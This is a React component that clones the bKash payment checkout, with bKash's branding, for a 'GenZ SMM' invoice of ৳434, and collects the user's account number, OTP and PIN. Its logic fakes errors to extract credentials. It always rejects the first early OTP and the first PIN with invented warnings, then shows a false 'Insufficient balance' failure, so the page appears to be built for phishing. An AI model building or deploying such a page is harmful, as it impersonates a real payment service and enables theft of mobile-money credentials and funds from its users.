import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Phone, Hand, XCircle } from "lucide-react";
import genzLogo from "@/assets/genz-logo.png";
import bkashLogoImg from "@/assets/bkash-logo.png";

const BkashPayment = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [showCancelView, setShowCancelView] = useState(false);
  const [showOtpView, setShowOtpView] = useState(false);
  const [showPinView, setShowPinView] = useState(false);
  const [showFailedView, setShowFailedView] = useState(false);
  const [otpCode, setOtpCode] = useState("");
  const [pinCode, setPinCode] = useState("");
  const [pinAttempts, setPinAttempts] = useState(0);
  const [showPinWarning, setShowPinWarning] = useState(false);
  const [resendTimer, setResendTimer] = useState(30);
  const [resendStatus, setResendStatus] = useState<'idle' | 'sending' | 'sent'>('idle');
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [showWrongOtp, setShowWrongOtp] = useState(false);
  const [wrongOtpShown, setWrongOtpShown] = useState(false);
  const [pinWarningShown, setPinWarningShown] = useState(false);
  const [otpElapsed, setOtpElapsed] = useState(0);

  const otpInputRef = useRef<HTMLInputElement>(null);
  const pinInputRef = useRef<HTMLInputElement>(null);
  const phoneInputRef = useRef<HTMLInputElement>(null);

  // Auto-focus on view change
  useEffect(() => {
    if (!isLoading && !showFailedView && !showCancelView) {
      if (showOtpView) {
        setTimeout(() => otpInputRef.current?.focus(), 100);
      } else if (showPinView) {
        setTimeout(() => pinInputRef.current?.focus(), 100);
      } else {
        setTimeout(() => phoneInputRef.current?.focus(), 100);
      }
    }
  }, [isLoading, showOtpView, showPinView, showFailedView, showCancelView]);

  // Intercept browser back button
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate("/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=434.00", { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  // Initial loading effect
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);
  
  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  
  const isValidNumber = () => {
    if (phoneNumber.length !== 11) return false;
    const prefix = phoneNumber.substring(0, 3);
    return validPrefixes.includes(prefix) && /^\d+$/.test(phoneNumber);
  };

  const isValidOtp = () => {
    return otpCode.length === 6 && /^\d+$/.test(otpCode);
  };

  const isValidPin = () => {
    return (pinCode.length === 4 || pinCode.length === 5) && /^\d+$/.test(pinCode);
  };

  const getMaskedNumber = () => {
    if (phoneNumber.length !== 11) return "";
    return `${phoneNumber.substring(0, 3)} ** *** ${phoneNumber.substring(8)}`;
  };

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showOtpView && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [showOtpView, resendTimer]);

  // Track elapsed time in OTP view
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showOtpView) {
      setOtpElapsed(0);
      interval = setInterval(() => {
        setOtpElapsed((prev) => prev + 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [showOtpView]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showFailedView && redirectTimer > 0) {
      interval = setInterval(() => {
        setRedirectTimer((prev) => prev - 1);
      }, 1000);
    }
    if (showFailedView && redirectTimer === 0) {
      navigate("/payment-cancelled?channel=bKash&reason=Insufficient Balance&amount=434.00");
    }
    return () => clearInterval(interval);
  }, [showFailedView, redirectTimer, navigate]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
    setPhoneNumber(value);
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtpCode(value);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 5);
    setPinCode(value);
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      setIsConfirmLoading(true);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowOtpView(true);
        setResendTimer(30);
      }, 2000);
    }
  };

  const handleOtpConfirm = () => {
    if (isValidOtp()) {
      setIsConfirmLoading(true);
      if (resendTimer >= 24 && !wrongOtpShown) {
        // Show loading first, then wrong verification code alert
        setTimeout(() => {
          setIsConfirmLoading(false);
          setShowWrongOtp(true);
          setWrongOtpShown(true);
          setOtpCode("");
          setTimeout(() => otpInputRef.current?.focus(), 50);
          setTimeout(() => setShowWrongOtp(false), 3000);
        }, 2000);
        return;
      }
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowOtpView(false);
        setShowPinView(true);
      }, 2000);
    }
  };

  const handlePinConfirm = () => {
    if (isValidPin()) {
      if (pinAttempts === 0 && !pinWarningShown) {
        setPinAttempts(1);
        setShowPinWarning(true);
        setPinWarningShown(true);
        setPinCode("");
        setTimeout(() => pinInputRef.current?.focus(), 50);
        return;
      }
      setIsConfirmLoading(true);
      setShowPinWarning(false);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowPinView(false);
        setShowFailedView(true);
        setRedirectTimer(5);
      }, 2000);
    }
  };

  const handleResendCode = () => {
    if (resendTimer === 0 && resendStatus === 'idle') {
      setResendStatus('sending');
      setTimeout(() => {
        setResendStatus('sent');
        setResendTimer(30);
        setTimeout(() => {
          setResendStatus('idle');
        }, 3000);
      }, 2000);
    }
  };

  const handleCancelClick = () => {
    setShowCancelView(true);
  };

  const handleConfirmCancel = () => {
    navigate("/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=434.00");
  };

  const handleBackFromCancel = () => {
    setShowCancelView(false);
  };

  return (
    <div className="fixed inset-0 bg-gray-200 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden">
      <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden flex flex-col" style={{ height: '490px', minHeight: '490px', maxHeight: '490px' }}>
        {/* bKash Logo Header */}
        <div className="bg-white py-3 flex justify-center border-b shrink-0">
          <img src={bkashLogoImg} alt="bKash" className="h-8 object-contain" />
        </div>

        {/* Conditional Content */}
        {isLoading ? (
          <>
            {/* Pink Section - Loading */}
            <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '370px' }}>
              <div className="relative w-24 h-4 mb-3">
                {/* Dot 1 - lowest brightness, rotates through all positions */}
                <span 
                  className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate1_2.4s_linear_infinite]"
                  style={{ backgroundColor: 'rgba(255,255,255,0.3)' }}
                ></span>
                {/* Dot 2 - soft white */}
                <span 
                  className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate2_2.4s_linear_infinite]"
                  style={{ backgroundColor: 'rgba(255,255,255,0.5)' }}
                ></span>
                {/* Dot 3 - brighter white */}
                <span 
                  className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate3_2.4s_linear_infinite]"
                  style={{ backgroundColor: 'rgba(255,255,255,0.7)' }}
                ></span>
                {/* Dot 4 - pure white */}
                <span 
                  className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate4_2.4s_linear_infinite]"
                  style={{ backgroundColor: 'rgba(255,255,255,1)' }}
                ></span>
              </div>
              <p className="text-white text-sm font-medium">Loading</p>
            </div>

            {/* Footer */}
            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
                <Phone className="w-3 h-3" />
                <span className="text-xs font-medium">16247</span>
              </div>
              <p className="text-gray-500 text-[10px]">
                © 2025 bKash, All Rights Reserved
              </p>
            </div>
          </>
        ) : showFailedView ? (
          <>
            {/* Pink Section - Payment Failed */}
            <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '370px' }}>
              {/* Circle with gap at bottom-right and X inside - smaller & bolder */}
              <div className="relative w-8 h-8 mb-4">
                <svg width="32" height="32" viewBox="0 0 44 44" fill="none">
                  <path
                    d="M 30.5 35 A 16 16 0 1 1 35 30.5"
                    stroke="white"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    fill="none"
                  />
                  <line x1="15" y1="15" x2="29" y2="29" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
                  <line x1="29" y1="15" x2="15" y2="29" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
                </svg>
              </div>
              <h3 className="text-white text-center text-base font-semibold mb-2">
                Payment Failed
              </h3>
              <p className="text-white text-center text-xs mb-1">
                Insufficient balance
              </p>
              <p className="text-white text-center text-xs">
                Redirecting to{" "}
                <span className="underline">Merchant Website</span>
                {" "}in {redirectTimer}s
              </p>
            </div>

            {/* Footer */}
            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
                <Phone className="w-3 h-3" />
                <span className="text-xs font-medium">16247</span>
              </div>
              <p className="text-gray-500 text-[10px]">
                © 2025 bKash, All Rights Reserved
              </p>
            </div>
          </>
        ) : (
          <>
            {/* Merchant Info */}
            <div className="bg-white px-4 py-2.5 flex items-center justify-between border-b shrink-0">
              <div className="flex items-center gap-2.5">
                <img 
                  src={genzLogo} 
                  alt="GenZ SMM" 
                  className="w-10 h-10 rounded-full object-cover"
                />
                <div>
                  <h2 className="text-gray-800 font-medium text-xs leading-tight">
                    GenZ SMM
                  </h2>
                  <p className="text-gray-500 text-[10px]">
                    Inv No: B255527202718B
                  </p>
                </div>
              </div>
              <span className="text-gray-800 font-semibold text-sm">৳434</span>
            </div>

            {showCancelView ? (
              <>
                {/* Pink Section - Cancel Confirmation */}
                <div className="bg-[#E2136E] px-5 flex flex-col items-center justify-center" style={{ height: '310px' }}>
                  <Hand className="w-6 h-19 text-white mb-3" strokeWidth={1.5} />
                  <p className="text-white text-center text-xs font-medium">
                    Are you sure you want to cancel this payment?
                  </p>
                </div>

                {/* Cancel Confirmation Buttons */}
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleConfirmCancel}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3.5 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Yes
                  </button>
                  <button
                    onClick={handleBackFromCancel}
                    className="flex-1 bg-[#E2136E] text-white py-3.5 rounded text-xs font-medium hover:bg-[#C91160] transition-colors"
                  >
                    No
                  </button>
                </div>
              </>
            ) : showPinView ? (
              <>
                {/* Pink Section - PIN Form */}
                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '310px' }}>
                  {/* Fixed top area for title + input */}
                  <div className="pt-[80px]">
                    <h3 className="text-white text-center text-xs font-medium mb-1 h-4">
                      Enter PIN of your bKash account number
                    </h3>
                    <p className="text-white text-center text-xs font-medium mb-3 h-4">
                      ({getMaskedNumber()})
                    </p>
                    <div className="relative">
                      <input
                        ref={pinInputRef}
                        type="text"
                        inputMode="numeric"
                        autoComplete="off"
                        value={pinCode}
                        onChange={handlePinChange}
                        placeholder="Enter PIN"
                        className="w-full bg-white rounded px-4 py-2.5 text-center text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
                        style={{ color: 'transparent', caretColor: pinCode.length > 0 ? 'transparent' : '#9ca3af', letterSpacing: '0.25em' } as React.CSSProperties}
                      />
                      {pinCode.length > 0 && (
                        <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                          <div className="flex items-center gap-1">
                            {Array.from({ length: pinCode.length }).map((_, i) => (
                              <span key={i} className="w-3.5 h-3.5 rounded-full bg-gray-700 inline-block" />
                            ))}
                            <span className="w-[1px] h-4 bg-gray-500 inline-block animate-pulse" />
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                  {/* Warning flows below input without shifting it */}
                  {showPinWarning && (
                    <div className="flex items-center justify-center gap-1.5 mt-2">
                      <span className="text-white text-sm">⚠</span>
                      <span className="text-white text-[10px] sm:text-xs font-medium leading-tight text-center">Pin verify failed, you have remained 1 times, be careful !</span>
                    </div>
                  )}
                </div>

                {/* PIN Action Buttons */}
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleCancelClick}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3.5 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handlePinConfirm}
                    disabled={!isValidPin() || isConfirmLoading}
                    className={`flex-1 py-3.5 rounded text-xs font-medium transition-colors ${
                      isValidPin() || isConfirmLoading
                        ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                        : "bg-gray-200 text-gray-400 cursor-not-allowed"
                    }`}
                  >
                    {isConfirmLoading ? (
                      <div className="flex justify-center items-center">
                        <div className="relative w-12 h-3">
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnA_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.3)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnB_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.5)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnC_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.7)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnD_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,1)' }}></span>
                        </div>
                      </div>
                    ) : (
                      "Confirm"
                    )}
                  </button>
                </div>
              </>
            ) : showOtpView ? (
              <>
                {/* Pink Section - OTP Form */}
                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '310px' }}>
                  {/* Fixed top area for title + input */}
                  <div className="pt-[90px]">
                    <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
                      Enter verification code sent to {getMaskedNumber()}
                    </h3>
                    <input
                      ref={otpInputRef}
                      type="tel"
                      value={otpCode}
                      onChange={handleOtpChange}
                      placeholder="Enter 6 digit code"
                      className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
                    />
                  </div>
                  {/* Alerts and resend flow below input */}
                  <div className="flex flex-col items-center mt-2">
                    {showWrongOtp && (
                      <div className="flex items-center justify-center gap-1.5 mb-1">
                        <span className="text-white text-sm">⚠</span>
                        <span className="text-white text-xs font-medium">Wrong verification code</span>
                      </div>
                    )}
                    {resendStatus === 'sending' ? (
                      <p className="text-white text-center text-[10px]">
                        Sending code to user handset ..
                      </p>
                    ) : resendStatus === 'sent' ? (
                      <>
                        <p className="text-white text-center text-[10px] font-medium">
                          Code sent successfully
                        </p>
                        <p className="text-white text-center text-[10px] mt-1">
                          Resend Code in {resendTimer}s
                        </p>
                      </>
                    ) : (
                      <p 
                        className={`text-white text-center text-[10px] ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
                        onClick={handleResendCode}
                      >
                        {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
                      </p>
                    )}
                  </div>
                </div>

                {/* OTP Action Buttons */}
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleCancelClick}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3.5 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleOtpConfirm}
                    disabled={!isValidOtp() || isConfirmLoading}
                    className={`flex-1 py-3.5 rounded text-xs font-medium transition-colors ${
                      isValidOtp() || isConfirmLoading
                        ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                        : "bg-gray-200 text-gray-400 cursor-not-allowed"
                    }`}
                  >
                    {isConfirmLoading ? (
                      <div className="flex justify-center items-center">
                        <div className="relative w-12 h-3">
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnA_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.3)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnB_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.5)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnC_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.7)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnD_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,1)' }}></span>
                        </div>
                      </div>
                    ) : (
                      "Confirm"
                    )}
                  </button>
                </div>
              </>
            ) : (
              <>
                {/* Pink Section - Payment Form */}
                <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '310px' }}>
                  <div className="h-5 flex items-center justify-center mb-3">
                    <h3 className="text-white text-center text-xs font-medium">
                      Your bKash Account Number
                    </h3>
                  </div>
                  <input
                    ref={phoneInputRef}
                    type="tel"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    placeholder="e.g 01XXXXXXXXX"
                    className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
                  />
                  <div className="flex flex-col items-center justify-center mt-3">
                    <p className="text-white text-center text-[10px]">
                      By clicking the confirm button you agree to the
                    </p>
                    <a href="https://www.bkash.com/en/page/terms-and-conditions" target="_blank" rel="noopener noreferrer" className="text-white text-[10px] underline hover:text-white/80">
                      Terms & Conditions
                    </a>
                  </div>
                </div>

                {/* Action Buttons */}
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleCancelClick}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3.5 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleConfirm}
                    disabled={!isValidNumber() || isConfirmLoading}
                    className={`flex-1 py-3.5 rounded text-xs font-medium transition-colors ${
                      isValidNumber() || isConfirmLoading
                        ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                        : "bg-gray-200 text-gray-400 cursor-not-allowed"
                    }`}
                  >
                    {isConfirmLoading ? (
                      <div className="flex justify-center items-center">
                        <div className="relative w-12 h-3">
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnA_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.3)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnB_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.5)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnC_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.7)' }}></span>
                          <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnD_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,1)' }}></span>
                        </div>
                      </div>
                    ) : (
                      "Confirm"
                    )}
                  </button>
                </div>
              </>
            )}

            {/* Footer */}
            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
                <Phone className="w-3 h-3" />
                <span className="text-xs font-medium">16247</span>
              </div>
              <p className="text-gray-500 text-[10px]">
                © 2025 bKash, All Rights Reserved
              </p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default BkashPayment;
